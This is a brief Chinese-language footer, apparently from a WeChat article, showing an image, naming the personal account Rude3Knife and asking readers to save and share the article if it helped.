![](https://mmbiz.qpic.cn/mmbiz_png/qm3R3LeH8raC7icyNr2k1kWdrlFUPkVvM5kdTaiakicSIdvMZaWBTEoiaxicG2ZlPcTZzTKlNDlibsojK7MnZe4qyMIw/640?wx_fmt=png)个人公众号：Rude3Knife

**如果文章对你有帮助，不妨收藏起来并转发给您的朋友们~**